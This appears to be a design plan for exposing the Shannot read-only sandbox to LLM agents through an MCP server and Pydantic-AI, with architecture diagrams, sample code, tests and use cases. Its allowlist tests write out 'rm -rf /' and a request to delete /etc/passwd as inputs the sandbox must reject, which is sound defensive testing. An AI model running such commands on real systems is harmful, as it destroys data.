# LLM Integration Plan for Shannot Sandbox

## Executive Summary

This document outlines two strategic approaches for integrating LLM agents with the Shannot sandbox:

1. **Model Context Protocol (MCP) Server** - Standardized tool interface for Claude and compatible agents
2. **Pydantic-AI Direct Integration** - Python agent framework with type-safe tool calling

**Recommendation**: Implement **both approaches in parallel** to maximize ecosystem compatibility:
- MCP for Claude Desktop, other MCP clients, and standardized integrations
- Pydantic-AI for custom Python applications and advanced workflows

---

## Table of Contents

1. [Architecture Analysis](#architecture-analysis)
2. [Approach 1: MCP Server Implementation](#approach-1-mcp-server-implementation)
3. [Approach 2: Pydantic-AI Integration](#approach-2-pydantic-ai-integration)
4. [Comparison Matrix](#comparison-matrix)
5. [Recommended Implementation Roadmap](#recommended-implementation-roadmap)
6. [Security Considerations](#security-considerations)
7. [Testing Strategy](#testing-strategy)
8. [Future Enhancements](#future-enhancements)

---

## Architecture Analysis

### Current Shannot Architecture

**Core Components**:
- `SandboxProfile`: Immutable configuration (commands, binds, tmpfs, environment)
- `SandboxManager`: Orchestration layer with allowlist enforcement
- `BubblewrapCommandBuilder`: Command construction from profile + user input
- `ProcessResult`: Structured execution outcomes (stdout, stderr, returncode, duration)

**Key Strengths for LLM Integration**:
1. **Profile-driven security**: Capabilities defined declaratively in JSON
2. **Type-safe Python API**: Full type hints, Pydantic-compatible
3. **Clean separation of concerns**: Sandbox logic isolated from execution
4. **Structured output**: ProcessResult maps cleanly to tool result schemas
5. **Zero external dependencies**: Easy deployment anywhere Python runs

**Integration Points**:
- Python API: `SandboxManager.run(command_list) -> ProcessResult`
- CLI: `shannot run <command...>` subprocess interface
- Profiles: Map to tool capabilities (allowed_commands → tool schemas)

---

## Approach 1: MCP Server Implementation

### Overview

Create an MCP (Model Context Protocol) server that exposes Shannot sandbox capabilities as standardized tools. MCP is Anthropic's protocol for connecting AI agents to external systems via tools and resources.

### Architecture

```
┌─────────────────┐
│  Claude Desktop │  (or any MCP client)
│   / API Client  │
└────────┬────────┘
         │ JSON-RPC over stdio/SSE
         ▼
┌─────────────────┐
│   MCP Server    │
│  (shannot-mcp)  │
├─────────────────┤
│ - Tool Registry │  Maps profiles → MCP tools
│ - Schema Gen    │  allowed_commands → tool args
│ - Result Format │  ProcessResult → MCP response
└────────┬────────┘
         │ Python API
         ▼
┌─────────────────┐
│ SandboxManager  │
│   + Profile     │
└─────────────────┘
         │ bubblewrap
         ▼
┌─────────────────┐
│  Linux System   │
└─────────────────┘
```

### Implementation Plan

#### Phase 1: Core MCP Server (Week 1-2)

**File**: `shannot/mcp_server.py`

```python
"""MCP server implementation for Shannot sandbox."""
from mcp.server import Server
from mcp.types import Tool, TextContent
from shannot import SandboxManager, load_profile_from_path
from pathlib import Path
import json

class ShannotMCPServer:
    """MCP server exposing sandbox profiles as tools."""
    
    def __init__(self, profile_paths: list[Path]):
        self.server = Server("shannot-sandbox")
        self.managers: dict[str, SandboxManager] = {}
        self._load_profiles(profile_paths)
        self._register_tools()
    
    def _load_profiles(self, paths: list[Path]):
        """Load sandbox profiles and create managers."""
        bwrap = Path("/usr/bin/bwrap")
        for path in paths:
            profile = load_profile_from_path(path)
            self.managers[profile.name] = SandboxManager(profile, bwrap)
    
    def _register_tools(self):
        """Register MCP tools from loaded profiles."""
        for name, manager in self.managers.items():
            # Create one tool per profile
            tool = Tool(
                name=f"sandbox_{name}",
                description=self._generate_description(manager.profile),
                inputSchema={
                    "type": "object",
                    "properties": {
                        "command": {
                            "type": "array",
                            "items": {"type": "string"},
                            "description": "Command and arguments to execute"
                        }
                    },
                    "required": ["command"]
                }
            )
            
            @self.server.call_tool()
            async def call_tool(tool_name: str, arguments: dict):
                if tool_name == tool.name:
                    return await self._execute_sandbox(name, arguments)
    
    async def _execute_sandbox(self, profile_name: str, args: dict):
        """Execute command in sandbox and return MCP-formatted result."""
        manager = self.managers[profile_name]
        command = args["command"]
        
        # Validate command against allowlist
        result = manager.run(command)
        
        # Format as MCP response
        if result.succeeded():
            return [TextContent(
                type="text",
                text=f"Exit code: {result.returncode}\n"
                     f"Duration: {result.duration:.2f}s\n\n"
                     f"{result.stdout}"
            )]
        else:
            return [TextContent(
                type="text",
                text=f"Command failed (exit {result.returncode})\n"
                     f"stderr: {result.stderr}"
            )]
    
    def _generate_description(self, profile) -> str:
        """Generate tool description from profile."""
        commands = ", ".join(profile.allowed_commands[:5])
        if len(profile.allowed_commands) > 5:
            commands += f", ... ({len(profile.allowed_commands)} total)"
        
        return (
            f"Execute commands in read-only sandbox '{profile.name}'. "
            f"Allowed commands: {commands}. "
            f"Network isolation: {profile.network_isolation}. "
            f"All file modifications are ephemeral (tmpfs)."
        )
```

**Entry point**: `shannot/mcp_main.py`

```python
"""MCP server entry point."""
import asyncio
from pathlib import Path
from shannot.mcp_server import ShannotMCPServer

async def main():
    # Load all available profiles
    profile_dir = Path.home() / ".config" / "shannot"
    profiles = list(profile_dir.glob("*.json"))
    
    # Also check system profiles
    if (Path(__file__).parent / "profiles").exists():
        profiles.extend((Path(__file__).parent / "profiles").glob("*.json"))
    
    server = ShannotMCPServer(profiles)
    await server.server.run()

if __name__ == "__main__":
    asyncio.run(main())
```

#### Phase 2: Enhanced Tool Schemas (Week 2-3)

**Features**:
1. **Dynamic tool generation per allowed command**
   - Instead of one tool per profile, create one tool per command
   - Example: `sandbox_minimal_ls`, `sandbox_diagnostics_df`
   - Better Claude experience (more specific tools)

2. **Argument validation**
   - Parse common flags from man pages or help output
   - Provide structured input schemas (e.g., `ls` with `-l`, `-a` flags)
   - LLM gets better guidance on valid arguments

3. **Resource exposure**
   - Expose profile configurations as MCP resources
   - Allow agents to inspect sandbox capabilities
   - `mcp://shannot/profiles/diagnostics.json`

**Example Enhanced Tool**:

```python
def _create_command_tool(self, profile_name: str, command: str) -> Tool:
    """Create an MCP tool for a specific command."""
    # Parse command to understand it better
    base_cmd = command.split("/")[-1].split("*")[-1]
    
    # Common command patterns
    schemas = {
        "ls": {
            "path": {"type": "string", "description": "Directory to list"},
            "long": {"type": "boolean", "description": "Long format (-l)"},
            "all": {"type": "boolean", "description": "Show hidden files (-a)"}
        },
        "cat": {
            "files": {"type": "array", "items": {"type": "string"}}
        },
        "grep": {
            "pattern": {"type": "string"},
            "files": {"type": "array", "items": {"type": "string"}},
            "recursive": {"type": "boolean"}
        }
    }
    
    schema = schemas.get(base_cmd, {
        "args": {"type": "array", "items": {"type": "string"}}
    })
    
    return Tool(
        name=f"sandbox_{profile_name}_{base_cmd}",
        description=f"Run '{base_cmd}' in {profile_name} sandbox (read-only)",
        inputSchema={
            "type": "object",
            "properties": schema
        }
    )
```

#### Phase 3: MCP Resources (Week 3-4)

**Expose Sandbox State as Resources**:

```python
@server.list_resources()
async def list_resources() -> list[Resource]:
    """List available sandbox profiles and system state."""
    resources = []
    
    # Profile resources
    for name, manager in self.managers.items():
        resources.append(Resource(
            uri=f"sandbox://profiles/{name}",
            name=f"Sandbox Profile: {name}",
            mimeType="application/json",
            description=f"Configuration for {name} sandbox"
        ))
    
    # System state resources (if diagnostics profile exists)
    if "diagnostics" in self.managers:
        resources.extend([
            Resource(
                uri="sandbox://system/disk",
                name="Disk Usage",
                description="Current disk usage via df -h"
            ),
            Resource(
                uri="sandbox://system/memory",
                name="Memory Info",
                description="Memory usage from /proc/meminfo"
            )
        ])
    
    return resources

@server.read_resource()
async def read_resource(uri: str) -> str:
    """Read resource content."""
    if uri.startswith("sandbox://profiles/"):
        profile_name = uri.split("/")[-1]
        profile = self.managers[profile_name].profile
        return json.dumps({
            "name": profile.name,
            "allowed_commands": profile.allowed_commands,
            "network_isolation": profile.network_isolation,
            # ... other profile fields
        }, indent=2)
    
    elif uri == "sandbox://system/disk":
        result = self.managers["diagnostics"].run(["df", "-h"])
        return result.stdout
    
    # ... other resource handlers
```

#### Phase 4: Configuration & Deployment (Week 4)

**MCP Server Configuration File**: `shannot/mcp-config.json`

```json
{
  "mcpServers": {
    "shannot-sandbox": {
      "command": "python",
      "args": ["-m", "shannot.mcp_main"],
      "env": {
        "SANDBOX_PROFILE_DIR": "~/.config/shannot",
        "BWRAP": "/usr/bin/bwrap"
      }
    }
  }
}
```

**Claude Desktop Integration**:

Users add to `~/Library/Application Support/Claude/claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "shannot": {
      "command": "shannot-mcp",
      "env": {
        "SANDBOX_PROFILE": "readonly"
      }
    }
  }
}
```

**Testing**:

```python
# tests/test_mcp_server.py
import pytest
from shannot.mcp_server import ShannotMCPServer
from pathlib import Path

@pytest.mark.asyncio
async def test_mcp_tool_execution():
    """Test MCP tool executes sandbox command."""
    server = ShannotMCPServer([Path("profiles/minimal.json")])
    
    result = await server._execute_sandbox(
        "minimal",
        {"command": ["ls", "/"]}
    )
    
    assert result[0].type == "text"
    assert "Exit code: 0" in result[0].text
    assert "bin" in result[0].text  # Should see /bin directory

@pytest.mark.asyncio
async def test_mcp_tool_validation():
    """Test MCP enforces command allowlist."""
    server = ShannotMCPServer([Path("profiles/minimal.json")])
    
    # This should fail - 'rm' not in minimal profile
    result = await server._execute_sandbox(
        "minimal",
        {"command": ["rm", "-rf", "/"]}
    )
    
    assert "not allowed" in result[0].text.lower()
```

### MCP Benefits

1. **Standardized Protocol**: Works with any MCP client (Claude Desktop, custom apps)
2. **Tool Discovery**: Agents automatically see available capabilities
3. **Resource Exposure**: Profiles and system state accessible via URI scheme
4. **Type Safety**: JSON schemas validate inputs before execution
5. **Ecosystem Integration**: Plays well with other MCP servers

### MCP Limitations

1. **Protocol Overhead**: JSON-RPC adds latency vs direct Python API
2. **Client Required**: Needs MCP-compatible client (Claude Desktop, custom wrapper)
3. **Limited to MCP Ecosystem**: Not usable by non-MCP agents (e.g., OpenAI function calling)

---

## Approach 2: Pydantic-AI Integration

### Overview

Integrate Shannot directly into Python applications using Pydantic-AI's agent framework. This provides type-safe tool calling with automatic validation and retry logic.

### Architecture

```
┌──────────────────┐
│  Your Python App │
│  (FastAPI, CLI)  │
└────────┬─────────┘
         │ async/await
         ▼
┌──────────────────┐
│  Pydantic-AI     │
│    Agent         │
├──────────────────┤
│ - @agent.tool    │  Decorated Shannot tools
│ - Dependencies   │  SandboxManager injection
│ - Validation     │  Pydantic models for I/O
└────────┬─────────┘
         │ Python API
         ▼
┌──────────────────┐
│ SandboxManager   │
│   + Profile      │
└────────┬─────────┘
         │ bubblewrap
         ▼
┌──────────────────┐
│  Linux System    │
└──────────────────┘
```

### Implementation Plan

#### Phase 1: Core Agent Setup (Week 1)

**File**: `shannot/pydantic_agent.py`

```python
"""Pydantic-AI agent integration for Shannot sandbox."""
from pydantic import BaseModel, Field
from pydantic_ai import Agent, RunContext
from shannot import SandboxManager, load_profile_from_path, SandboxError
from pathlib import Path
from typing import Annotated

# Dependencies (injected into agent)
class SandboxDeps:
    """Dependencies for sandbox agent."""
    
    def __init__(self, profile_name: str = "readonly"):
        profile_path = Path.home() / ".config" / "shannot" / f"{profile_name}.json"
        self.profile = load_profile_from_path(profile_path)
        self.manager = SandboxManager(self.profile, Path("/usr/bin/bwrap"))

# Tool input/output models
class CommandInput(BaseModel):
    """Input for running a sandbox command."""
    command: list[str] = Field(
        description="Command and arguments to execute in sandbox"
    )

class CommandOutput(BaseModel):
    """Output from sandbox command execution."""
    stdout: str = Field(description="Standard output from command")
    stderr: str = Field(description="Standard error from command")
    returncode: int = Field(description="Exit code (0 = success)")
    duration: float = Field(description="Execution time in seconds")
    succeeded: bool = Field(description="Whether command succeeded")

# Create agent
sandbox_agent = Agent(
    'openai:gpt-4',  # or 'anthropic:claude-3-5-sonnet-20241022'
    deps_type=SandboxDeps,
    system_prompt=(
        "You are a system administrator assistant with read-only access "
        "to a Linux system via a secure sandbox. You can inspect files, "
        "check system status, and gather diagnostics, but cannot modify "
        "anything. All commands run in an isolated, read-only environment."
    )
)

@sandbox_agent.tool
async def run_sandbox_command(
    ctx: RunContext[SandboxDeps],
    command_input: CommandInput
) -> CommandOutput:
    """
    Execute a command in the read-only sandbox.
    
    The sandbox provides:
    - Read-only access to system files
    - Network isolation
    - Ephemeral /tmp (changes lost after command)
    - Command allowlisting (only approved commands run)
    
    Use this to:
    - Inspect files: cat, head, tail, grep
    - List directories: ls, find
    - Check system status: df, free, ps
    """
    try:
        result = ctx.deps.manager.run(command_input.command)
        
        return CommandOutput(
            stdout=result.stdout,
            stderr=result.stderr,
            returncode=result.returncode,
            duration=result.duration,
            succeeded=result.succeeded()
        )
    
    except SandboxError as e:
        # Let LLM know what went wrong so it can retry
        return CommandOutput(
            stdout="",
            stderr=f"Sandbox error: {e}",
            returncode=-1,
            duration=0.0,
            succeeded=False
        )

# Specialized tools for common operations
@sandbox_agent.tool
async def read_file(
    ctx: RunContext[SandboxDeps],
    path: Annotated[str, Field(description="Absolute path to file")]
) -> str:
    """Read the contents of a file from the system."""
    result = ctx.deps.manager.run(["cat", path])
    if result.succeeded():
        return result.stdout
    else:
        return f"Error reading file: {result.stderr}"

@sandbox_agent.tool
async def list_directory(
    ctx: RunContext[SandboxDeps],
    path: Annotated[str, Field(description="Directory path to list")],
    long_format: Annotated[bool, Field(description="Show detailed info")] = False
) -> str:
    """List contents of a directory."""
    cmd = ["ls", "-l" if long_format else "", path]
    cmd = [c for c in cmd if c]  # Remove empty strings
    
    result = ctx.deps.manager.run(cmd)
    return result.stdout if result.succeeded() else result.stderr

@sandbox_agent.tool
async def check_disk_usage(
    ctx: RunContext[SandboxDeps]
) -> str:
    """Get disk usage information for all mounted filesystems."""
    result = ctx.deps.manager.run(["df", "-h"])
    return result.stdout if result.succeeded() else result.stderr

@sandbox_agent.tool
async def check_memory(
    ctx: RunContext[SandboxDeps]
) -> str:
    """Get memory usage information."""
    result = ctx.deps.manager.run(["free", "-h"])
    return result.stdout if result.succeeded() else result.stderr
```

#### Phase 2: Application Integration Examples (Week 2)

**Example 1: FastAPI Endpoint**

```python
# examples/fastapi_server.py
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from shannot.pydantic_agent import sandbox_agent, SandboxDeps

app = FastAPI()

class DiagnosticRequest(BaseModel):
    query: str

class DiagnosticResponse(BaseModel):
    result: str
    usage: dict

@app.post("/diagnose")
async def diagnose_system(req: DiagnosticRequest) -> DiagnosticResponse:
    """Run LLM-powered system diagnostics."""
    deps = SandboxDeps(profile_name="diagnostics")
    
    result = await sandbox_agent.run(
        req.query,
        deps=deps
    )
    
    return DiagnosticResponse(
        result=result.data,
        usage={
            "model": result.model,
            "tokens": result.usage().total_tokens
        }
    )

# Usage:
# POST /diagnose
# {"query": "Check if disk space is running low and show me the biggest directories"}
```

**Example 2: CLI Diagnostic Tool**

```python
# examples/diagnostic_cli.py
import asyncio
from shannot.pydantic_agent import sandbox_agent, SandboxDeps

async def interactive_diagnostics():
    """Interactive CLI for system diagnostics."""
    deps = SandboxDeps(profile_name="diagnostics")
    
    print("System Diagnostic Assistant")
    print("Ask me about disk usage, memory, processes, or files.")
    print("Type 'quit' to exit.\n")
    
    while True:
        query = input("You: ")
        if query.lower() in ("quit", "exit"):
            break
        
        # Stream response token by token
        async with sandbox_agent.run_stream(query, deps=deps) as stream:
            print("Assistant: ", end="", flush=True)
            async for chunk in stream.stream_text():
                print(chunk, end="", flush=True)
            print("\n")

if __name__ == "__main__":
    asyncio.run(interactive_diagnostics())
```

**Example 3: Monitoring Agent with Human-in-the-Loop**

```python
# examples/monitoring_agent.py
from pydantic_ai import Agent
from shannot.pydantic_agent import SandboxDeps
from shannot import SandboxManager

# Agent with approval for sensitive operations
monitoring_agent = Agent(
    'anthropic:claude-3-5-sonnet-20241022',
    deps_type=SandboxDeps,
    system_prompt=(
        "You are a monitoring agent. Regularly check system health "
        "and alert on issues. Be proactive but request approval for "
        "any sensitive investigations."
    )
)

# Copy tools from sandbox_agent
monitoring_agent.tool(run_sandbox_command)
monitoring_agent.tool(check_disk_usage)
monitoring_agent.tool(check_memory)

# Add human approval for sensitive paths
@monitoring_agent.tool(requires_approval=lambda args: "/etc" in str(args))
async def investigate_config(
    ctx: RunContext[SandboxDeps],
    path: str
) -> str:
    """Investigate configuration files (requires approval)."""
    result = ctx.deps.manager.run(["cat", path])
    return result.stdout if result.succeeded() else result.stderr

async def monitor_loop():
    """Continuous monitoring with human oversight."""
    deps = SandboxDeps(profile_name="diagnostics")
    
    while True:
        result = await monitoring_agent.run(
            "Check system health and report any issues",
            deps=deps
        )
        
        print(f"[{datetime.now()}] {result.data}")
        
        await asyncio.sleep(300)  # Check every 5 minutes

if __name__ == "__main__":
    asyncio.run(monitor_loop())
```

#### Phase 3: Advanced Features (Week 3)

**Structured Output with Validation**:

```python
from pydantic import BaseModel, Field
from enum import Enum

class HealthStatus(str, Enum):
    HEALTHY = "healthy"
    WARNING = "warning"
    CRITICAL = "critical"

class SystemHealth(BaseModel):
    """Structured system health report."""
    status: HealthStatus
    disk_usage_percent: int = Field(ge=0, le=100)
    memory_usage_percent: int = Field(ge=0, le=100)
    issues: list[str] = Field(default_factory=list)
    recommendations: list[str] = Field(default_factory=list)

# Agent with structured output
health_agent = Agent(
    'anthropic:claude-3-5-sonnet-20241022',
    deps_type=SandboxDeps,
    result_type=SystemHealth,  # Force structured output
)

# Use same tools
health_agent.tool(check_disk_usage)
health_agent.tool(check_memory)

async def get_structured_health() -> SystemHealth:
    """Get validated, structured health report."""
    deps = SandboxDeps(profile_name="diagnostics")
    
    result = await health_agent.run(
        "Analyze system health and provide structured report",
        deps=deps
    )
    
    # result.data is guaranteed to be SystemHealth instance
    return result.data
```

**Multi-Profile Support**:

```python
class MultiProfileDeps:
    """Dependencies with multiple sandbox profiles."""
    
    def __init__(self):
        self.profiles = {}
        for profile_name in ["minimal", "readonly", "diagnostics"]:
            path = Path.home() / ".config" / "shannot" / f"{profile_name}.json"
            profile = load_profile_from_path(path)
            self.profiles[profile_name] = SandboxManager(
                profile,
                Path("/usr/bin/bwrap")
            )
    
    def get_manager(self, profile: str = "readonly") -> SandboxManager:
        return self.profiles.get(profile, self.profiles["readonly"])

@advanced_agent.tool
async def run_in_profile(
    ctx: RunContext[MultiProfileDeps],
    command: list[str],
    profile: str = "readonly"
) -> CommandOutput:
    """Run command in specific sandbox profile."""
    manager = ctx.deps.get_manager(profile)
    result = manager.run(command)
    
    return CommandOutput(
        stdout=result.stdout,
        stderr=result.stderr,
        returncode=result.returncode,
        duration=result.duration,
        succeeded=result.succeeded()
    )
```

#### Phase 4: Testing & Documentation (Week 4)

```python
# tests/test_pydantic_agent.py
import pytest
from shannot.pydantic_agent import (
    sandbox_agent, 
    SandboxDeps,
    read_file,
    list_directory
)

@pytest.mark.asyncio
async def test_agent_reads_file():
    """Test agent can read files."""
    deps = SandboxDeps(profile_name="minimal")
    
    result = await sandbox_agent.run(
        "Read the /etc/os-release file",
        deps=deps
    )
    
    assert "NAME=" in result.data
    assert result.usage().total_tokens > 0

@pytest.mark.asyncio
async def test_agent_handles_errors():
    """Test agent gracefully handles command failures."""
    deps = SandboxDeps(profile_name="minimal")
    
    result = await sandbox_agent.run(
        "Try to delete /etc/passwd",  # Should fail - rm not allowed
        deps=deps
    )
    
    assert "not allowed" in result.data.lower() or "error" in result.data.lower()

@pytest.mark.asyncio
async def test_structured_output():
    """Test agent returns validated structured output."""
    deps = SandboxDeps(profile_name="diagnostics")
    health = await get_structured_health()
    
    assert isinstance(health, SystemHealth)
    assert 0 <= health.disk_usage_percent <= 100
    assert health.status in HealthStatus
```

### Pydantic-AI Benefits

1. **Type Safety**: Pydantic validates all inputs/outputs at runtime
2. **Native Python**: No protocol overhead, direct function calls
3. **Flexibility**: Works with any LLM provider (OpenAI, Anthropic, etc.)
4. **Rich Features**: Streaming, structured output, human-in-the-loop
5. **Better DX**: IDE autocomplete, type checking, refactoring support
6. **Dependency Injection**: Clean separation of concerns

### Pydantic-AI Limitations

1. **Python Only**: Not usable from non-Python applications
2. **No Standardization**: Each application builds custom interface
3. **Client-Side Logic**: Agent runs in your app (not external like MCP)

---

## Use Case Clarification: When to Use Each Approach

### The Fundamental Difference

**MCP = "Give the LLM access to tools"**  
You provide tools to an existing LLM interface (like Claude Desktop). The user talks to Claude, and Claude uses your tools when needed.

**Pydantic-AI = "Build an LLM-powered application"**  
You write Python code that orchestrates the LLM. Your code decides when to call the LLM, what tools to give it, and what to do with results.

---

## Concrete Use Case Examples

### Use Case 1: End-User Wants to Chat with Claude Desktop

**Scenario**: Sarah is a DevOps engineer. She opens Claude Desktop on her Mac and wants to ask Claude to check disk space on her production servers.

**Solution: MCP Server** ✅

```
Sarah opens Claude Desktop → Types "Check disk space on server"
                          ↓
Claude sees shannot-mcp tools available
                          ↓
Claude calls sandbox_diagnostics_df tool
                          ↓
MCP server executes in sandbox
                          ↓
Claude responds: "Your /var partition is 89% full..."
```

**Why MCP?**
- Sarah doesn't write any code
- Claude Desktop already exists, she just adds tools to it
- Works immediately with the chat interface she's familiar with
- She can use natural language: "Is my disk full?" instead of learning a Python API

**Why NOT Pydantic-AI?**
- Would require Sarah to run Python scripts
- No existing interface - she'd need to build one
- More work for same result

---

### Use Case 2: Developer Wants to Build a Monitoring Dashboard

**Scenario**: Alex is building a web application with FastAPI that shows system health. He wants an LLM to analyze metrics and explain issues to users in natural language.

**Solution: Pydantic-AI** ✅

```python
# Alex's FastAPI endpoint
@app.get("/health-report")
async def health_report():
    deps = SandboxDeps(profile_name="diagnostics")
    
    # Alex's Python code calls the LLM
    result = await sandbox_agent.run(
        "Analyze system health and explain any issues",
        deps=deps
    )
    
    # Alex's code uses the result
    return {
        "report": result.data,
        "generated_at": datetime.now()
    }
```

**Why Pydantic-AI?**
- Alex needs programmatic control (when to call LLM, what data to return)
- He wants to embed LLM reasoning into his app's logic
- He needs structured output (not just chat)
- He's already writing Python code (FastAPI)

**Why NOT MCP?**
- MCP requires a separate client (Claude Desktop, custom MCP client)
- MCP is for chat-like interfaces, not programmatic use
- Alex would need to build an MCP client just to call his MCP server (extra complexity)

---

### Use Case 3: Team Wants Shared Diagnostic Tools for Claude

**Scenario**: A team of 10 engineers all use Claude Desktop. They want everyone to have the same set of approved diagnostic commands available when chatting with Claude.

**Solution: MCP Server** ✅

```bash
# Team admin creates one MCP config
# Everyone on team adds to their Claude Desktop config
{
  "mcpServers": {
    "company-diagnostics": {
      "command": "ssh",
      "args": ["tools.company.com", "shannot-mcp", "--profile", "company-approved"]
    }
  }
}

# Now all 10 engineers can ask Claude:
# "Check memory on prod-db-1"
# "Show me recent errors in nginx logs"
# Claude uses the shared MCP tools automatically
```

**Why MCP?**
- Centralized tool deployment (one server, many users)
- No code needed by end users
- Works with existing Claude Desktop workflow
- Standard protocol ensures compatibility

**Why NOT Pydantic-AI?**
- Each engineer would need to run Python scripts
- No shared interface - everyone builds their own
- Duplicated effort across team

---

### Use Case 4: Automated Monitoring System

**Scenario**: A cron job needs to run every 5 minutes, check system health with an LLM, and send alerts to Slack if issues are found.

**Solution: Pydantic-AI** ✅

```python
# monitoring_job.py (runs via cron)
async def check_and_alert():
    deps = SandboxDeps(profile_name="diagnostics")
    
    # Run health check
    health = await health_agent.run(
        "Check system health",
        deps=deps
    )
    
    # Python logic decides what to do
    if health.data.status == HealthStatus.CRITICAL:
        await slack_client.send_message(
            channel="#alerts",
            message=f"🚨 Critical: {health.data.issues}"
        )

# Cron: */5 * * * * python monitoring_job.py
```

**Why Pydantic-AI?**
- Fully automated (no human in the loop)
- Python code orchestrates: check health → decide → alert
- Structured output (health.data.status) for logic
- Runs headless (no chat interface needed)

**Why NOT MCP?**
- MCP requires a client (what would connect to it?)
- MCP is designed for interactive chat, not batch jobs
- Would need to build custom MCP client just to call MCP server (overcomplicated)

---

### Use Case 5: Multi-Step Diagnostic Workflow

**Scenario**: When disk is full, automatically: 1) Find large files, 2) Check if they're logs, 3) Suggest rotation, 4) Generate cleanup script.

**Solution: Pydantic-AI** ✅

```python
async def diagnose_disk_full():
    deps = SandboxDeps(profile_name="diagnostics")
    
    # Step 1: Check disk
    disk_result = await check_disk_usage(RunContext(deps=deps))
    
    # Step 2: Python logic decides next step
    if "9[0-9]%" in disk_result:  # Over 90% full
        # Step 3: Find large files
        large_files = await sandbox_agent.run(
            "Find the 10 largest files in /var/log",
            deps=deps
        )
        
        # Step 4: Generate cleanup plan
        plan = await sandbox_agent.run(
            f"Given these large files: {large_files.data}, "
            f"suggest safe cleanup commands",
            deps=deps
        )
        
        return plan.data
```

**Why Pydantic-AI?**
- Multi-step workflow with conditional logic
- Python code controls flow (if disk full → then find files → then suggest cleanup)
- Mix of LLM calls and deterministic code
- Structured data passing between steps

**Why NOT MCP?**
- MCP tools are stateless (can't easily build multi-step workflows)
- Would need separate orchestration layer
- Chat interface doesn't naturally support "do A, then if X do B, else do C"

---

## Comparison Matrix

| Aspect | MCP Server | Pydantic-AI |
|--------|-----------|-------------|
| **Who uses it?** | End users (DevOps, SREs) | Developers building apps |
| **Interface** | Chat (Claude Desktop, etc.) | Python API (code) |
| **Use Case** | "I want Claude to have tools" | "I want to build an LLM app" |
| **Interaction** | Human ↔ Claude ↔ Tools | Code ↔ LLM ↔ Tools |
| **Deployment** | Separate server process | In-process or microservice |
| **Control Flow** | LLM decides when to use tools | Your code decides when to call LLM |
| **Output** | Natural language (chat) | Structured data (Pydantic models) |
| **Best For** | Interactive diagnostics, ad-hoc queries | Automation, dashboards, workflows |
| **Example** | "Claude, check my disk space" | FastAPI endpoint that analyzes health |

---

## Decision Tree: Which Approach Should I Use?

```
Are you building this for yourself or other developers to write code with?
│
├─ YES → Use Pydantic-AI
│         Examples:
│         • FastAPI service with LLM endpoint
│         • Automated cron job
│         • CLI tool you'll run yourself
│         • Dashboard with AI analysis
│         • Multi-step workflow with logic
│
└─ NO → Are end-users going to interact with it?
         │
         ├─ YES, via chat interface → Use MCP Server
         │                            Examples:
         │                            • Claude Desktop with custom tools
         │                            • Shared team diagnostics via Claude
         │                            • Non-technical users asking questions
         │
         └─ YES, via custom UI → Use Pydantic-AI
                                  (Build your UI, use Pydantic-AI backend)
                                  Examples:
                                  • Web dashboard with chat widget
                                  • Slack bot
                                  • Custom desktop app
```

### Quick Reference Questions

**Ask yourself:**

1. **"Will people chat with Claude Desktop?"**  
   → YES = MCP | NO = Keep reading

2. **"Am I writing Python code that needs to call an LLM?"**  
   → YES = Pydantic-AI | NO = Keep reading

3. **"Do I need multi-step logic or conditional workflows?"**  
   → YES = Pydantic-AI | NO = Keep reading

4. **"Do I want zero code for end users?"**  
   → YES = MCP | NO = Pydantic-AI

5. **"Is this automated/headless?"**  
   → YES = Pydantic-AI | NO = MCP

### The Layered Architecture (Recommended)

**Use Pydantic-AI as the foundation, MCP as the interface**:

```python
# Layer 1: Pydantic-AI Tools (shannot/tools.py)
# These are reusable, type-safe, standalone
from pydantic import BaseModel
from shannot import SandboxManager

class CommandInput(BaseModel):
    command: list[str]

class CommandOutput(BaseModel):
    stdout: str
    stderr: str
    returncode: int
    
async def run_command(ctx, input: CommandInput) -> CommandOutput:
    """Core tool - no MCP dependency"""
    result = ctx.deps.manager.run(input.command)
    return CommandOutput(
        stdout=result.stdout,
        stderr=result.stderr,
        returncode=result.returncode
    )

# Layer 2: MCP Server (shannot/mcp_server.py)
# Thin wrapper exposing Pydantic tools via MCP
from mcp.server import Server
from shannot.tools import run_command, CommandInput

server = Server("shannot")

@server.call_tool()
async def call_tool(name: str, arguments: dict):
    if name == "sandbox_run_command":
        # Pydantic validates input
        input = CommandInput(**arguments)
        
        # Call Pydantic tool
        result = await run_command(ctx, input)
        
        # Format for MCP
        return [TextContent(
            type="text",
            text=f"Exit {result.returncode}\n{result.stdout}"
        )]

# Layer 3: Standalone Agent (shannot/agent.py) - FUTURE
# For developers who want full agent, not just tools
from pydantic_ai import Agent
from shannot.tools import run_command, read_file, list_directory

agent = Agent('anthropic:claude-3-5-sonnet-20241022')
agent.tool(run_command)
agent.tool(read_file)
agent.tool(list_directory)
```

This gives you:
1. **Type-safe core** (Pydantic-AI tools)
2. **MCP interface** for Claude Desktop (Phase 1-3)
3. **Standalone agent** for developers (Phase 4-5)
4. **No duplication** - same tools, multiple interfaces

---

## Recommended Implementation Roadmap

### 🎯 Phase 1: MCP Server MVP (Weeks 1-2) - **START HERE**

**Goal**: Ship working MCP server for Claude Desktop users

**Architecture Decision**: Use Pydantic-AI internally from day one!

```
User → Claude Desktop → MCP Server → Pydantic-AI Tools → SandboxManager → bubblewrap
```

**Why Pydantic-AI from the start:**
- ✅ **Type safety**: Pydantic validates all tool inputs/outputs
- ✅ **Better structure**: Clean tool definitions with proper schemas
- ✅ **Reusability**: Same tools can be used standalone later
- ✅ **Validation**: Automatic retry on validation errors
- ✅ **Future-proof**: Easy to add LLM reasoning to tools later

**Deliverables**:
1. **Pydantic-AI tool layer** (`shannot/tools.py`)
   - Core tools: run_command, read_file, list_directory, check_disk
   - Type-safe with Pydantic models
   - Independent of MCP (can be used standalone)

2. **MCP server wrapper** (`shannot/mcp_server.py`)
   - Thin wrapper around Pydantic-AI tools
   - Exposes tools via MCP protocol
   - Handles MCP-specific formatting
   
3. **Basic MCP server** functionality
   - Load profiles from `~/.config/shannot/`
   - Expose 1 tool per profile (e.g., `sandbox_readonly`, `sandbox_diagnostics`)
   - Simple input: `{"command": ["ls", "/"]}`
   - Structured output: stdout, stderr, returncode, duration

2. **Installation script**
   ```bash
   pip install shannot[mcp]
   shannot mcp install  # Auto-configures Claude Desktop
   ```

3. **Documentation**
   - Quick start guide (5 minutes to working)
   - Claude Desktop config example
   - Common use cases (check disk, read logs, inspect files)

4. **Testing**
   - Test with actual Claude Desktop
   - 5+ real diagnostic scenarios
   - Security validation (command allowlist enforcement)

**Success Criteria**:
- ✅ User can install and configure in <5 minutes
